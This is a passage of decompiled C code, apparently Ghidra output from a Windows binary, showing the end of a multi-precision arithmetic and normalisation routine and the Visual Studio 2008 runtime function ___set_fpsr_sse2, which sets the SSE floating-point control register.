      param_3[1] = uVar10;
      if (bVar4) {
        param_3[2] = param_3[2] + 1;
      }
      param_3[2] = param_3[2] + uVar11;
      bVar4 = false;
      uVar1 = uVar2 * 2;
      uVar11 = uVar10 * 2 | uVar2 >> 0x1f;
      uVar10 = param_3[2] * 2 | uVar10 >> 0x1f;
      *param_3 = uVar1;
      param_3[1] = uVar11;
      param_3[2] = uVar10;
      uVar2 = uVar1 + (int)*param_1;
      if ((uVar2 < uVar1) || (uVar2 < (uint)(int)*param_1)) {
        bVar4 = true;
      }
      *param_3 = uVar2;
      if (bVar4) {
        uVar2 = uVar11 + 1;
        bVar4 = false;
        if ((uVar2 < uVar11) || (uVar2 == 0)) {
          bVar4 = true;
        }
        param_3[1] = uVar2;
        if (bVar4) {
          param_3[2] = uVar10 + 1;
        }
      }
      param_2 = param_2 + -1;
      param_1 = param_1 + 1;
    } while (param_2 != 0);
  }
  while (param_3[2] == 0) {
    param_3[2] = param_3[1] >> 0x10;
    sVar6 = sVar6 + -0x10;
    param_3[1] = param_3[1] << 0x10 | *param_3 >> 0x10;
    *param_3 = *param_3 << 0x10;
  }
  uVar2 = param_3[2];
  while ((uVar2 & 0x8000) == 0) {
    uVar10 = *param_3;
    uVar1 = param_3[1];
    sVar6 = sVar6 + -1;
    *param_3 = uVar10 * 2;
    uVar2 = param_3[2] * 2;
    param_3[1] = uVar1 * 2 | uVar10 >> 0x1f;
    param_3[2] = uVar2 | uVar1 >> 0x1f;
  }
  *(short *)((int)param_3 + 10) = sVar6;
  ___security_check_cookie_4(uVar7 ^ (uint)&stack0xfffffffc);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___set_fpsr_sse2
// 
// Library: Visual Studio 2008 Release

void __cdecl ___set_fpsr_sse2(uint param_1)

{
  if (DAT_00424fd4 != 0) {
    if (((param_1 & 0x40) == 0) || (DAT_00423444 == 0)) {
      MXCSR = param_1 & 0xffffffbf;
    }
    else {
      MXCSR = param_1;
    }
  }
  return;
}


